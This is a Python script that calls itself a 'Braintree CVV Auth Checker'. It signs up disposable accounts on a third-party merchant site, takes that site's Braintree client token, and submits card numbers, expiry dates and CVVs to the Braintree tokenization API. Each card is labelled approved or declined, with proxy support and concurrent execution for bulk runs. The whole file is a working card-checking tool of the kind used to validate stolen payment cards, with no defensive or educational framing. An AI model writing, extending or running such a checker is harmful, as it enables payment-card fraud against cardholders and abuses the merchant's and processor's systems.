"""
Braintree CVV Auth Checker
Uses direct Braintree API for CVV validation via tokenization.
"""

import asyncio
import random
import uuid
import base64
import json
from concurrent.futures import ThreadPoolExecutor
from typing import Optional

import httpx

executor = ThreadPoolExecutor(max_workers=10)


# Braintree endpoints for various merchants
BRAINTREE_MERCHANTS = [
    {
        "name": "Pixorize",
        "register_url": "https://apitwo.pixorize.com/users/register-simple",
        "token_url": "https://apitwo.pixorize.com/braintree/token",
    },
]


def generate_random_email() -> str:
    """Generate random email address."""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    username = ''.join(random.choices(chars, k=10))
    domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com"]
    return f"{username}@{random.choice(domains)}"


def check_braintree_cvv_sync(card: str, mes: str, ano: str, cvv: str, proxy: Optional[str] = None) -> dict:
    """
    Check Braintree CVV authentication via Pixorize.
    
    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year (2 or 4 digits)
        cvv: CVV code
        proxy: Optional proxy string
        
    Returns:
        dict with status and response
    """
    try:
        # Normalize year
        if len(ano) == 4:
            ano = ano[2:]
        if len(mes) == 1:
            mes = f"0{mes}"
        
        # Setup proxy
        proxies = None
        if proxy:
            proxy_url = proxy if proxy.startswith("http") else f"http://{proxy}"
            proxies = {"http://": proxy_url, "https://": proxy_url}
        
        # Create client
        client = httpx.Client(
            timeout=60.0,
            proxies=proxies,
            follow_redirects=True
        )
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'sec-ch-ua': '"Chromium";v="120", "Not/A)Brand";v="24"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://pixorize.com",
            'Referer': "https://pixorize.com/",
        }
        
        # Step 1: Register user
        email = generate_random_email()
        register_payload = {
            "email": email,
            "password": f"Pass{random.randint(1000, 9999)}!@#",
            "learner_classification": 1
        }
        
        response = client.post(
            "https://apitwo.pixorize.com/users/register-simple",
            json=register_payload,
            headers=headers
        )
        
        if response.status_code not in [200, 201]:
            client.close()
            return {
                "status": "error",
                "response": "Registration Failed"
            }
        
        # Step 2: Get Braintree token
        response = client.get(
            "https://apitwo.pixorize.com/braintree/token",
            headers=headers
        )
        
        if response.status_code != 200:
            client.close()
            return {
                "status": "error",
                "response": "Token Fetch Failed"
            }
        
        try:
            token_data = response.json()
            client_token = token_data['payload']['clientToken']
            decoded = base64.b64decode(client_token).decode('utf-8')
            auth_fingerprint = json.loads(decoded)['authorizationFingerprint']
        except Exception as e:
            client.close()
            return {
                "status": "error",
                "response": f"Token Parse Failed: {str(e)[:30]}"
            }
        
        # Step 3: Tokenize card via Braintree GraphQL
        tokenize_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": str(uuid.uuid4())
            },
            "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        expirationMonth
                        expirationYear
                        binData {
                            prepaid
                            healthcare
                            debit
                            commercial
                            issuingBank
                            countryOfIssuance
                        }
                    }
                }
            }""",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card,
                        "expirationMonth": mes,
                        "expirationYear": f"20{ano}",
                        "cvv": cvv,
                        "billingAddress": {"postalCode": "10001"}
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        
        braintree_headers = {
            'User-Agent': headers['User-Agent'],
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {auth_fingerprint}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Referer': 'https://assets.braintreegateway.com/'
        }
        
        response = client.post(
            "https://payments.braintree-api.com/graphql",
            json=tokenize_payload,
            headers=braintree_headers
        )
        
        client.close()
        
        # Parse tokenization response
        try:
            data = response.json()
        except:
            return {
                "status": "error",
                "response": "Invalid API Response"
            }
        
        # Check for errors
        if "errors" in data and data["errors"]:
            error_msg = data["errors"][0].get("message", "Unknown Error")
            error_upper = error_msg.upper()
            
            # CVV/CVC validation errors indicate card is valid
            if any(x in error_upper for x in ["CVV", "CVC", "SECURITY", "VERIFICATION"]):
                return {
                    "status": "approved",
                    "response": f"CVV_REQUIRED: {error_msg}"
                }
            
            # Other errors
            return {
                "status": "declined",
                "response": error_msg
            }
        
        # Check for successful tokenization
        if "data" in data and data["data"].get("tokenizeCreditCard"):
            token_result = data["data"]["tokenizeCreditCard"]
            
            if token_result.get("token"):
                # Card was tokenized successfully
                cc_info = token_result.get("creditCard", {})
                bin_data = cc_info.get("binData", {})
                
                bank = bin_data.get("issuingBank", "Unknown")
                country = bin_data.get("countryOfIssuance", "Unknown")
                
                return {
                    "status": "approved",
                    "response": f"CVV_MATCHED ✓ Bank: {bank[:30]}"
                }
            else:
                return {
                    "status": "declined",
                    "response": "Tokenization Failed"
                }
        
        # Default decline
        return {
            "status": "declined",
            "response": str(data)[:100]
        }
        
    except httpx.TimeoutException:
        return {
            "status": "error",
            "response": "Request Timeout"
        }
    except httpx.ConnectError:
        return {
            "status": "error",
            "response": "Connection Error"
        }
    except Exception as e:
        return {
            "status": "error",
            "response": f"Error: {str(e)[:50]}"
        }


async def async_check_braintree_cvv(
    card: str, 
    mes: str, 
    ano: str, 
    cvv: str, 
    proxy: Optional[str] = None
) -> dict:
    """
    Async wrapper for Braintree CVV checking.
    
    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year
        cvv: CVV code
        proxy: Optional proxy
        
    Returns:
        dict with status and response
    """
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        executor, 
        check_braintree_cvv_sync, 
        card, mes, ano, cvv, proxy
    )
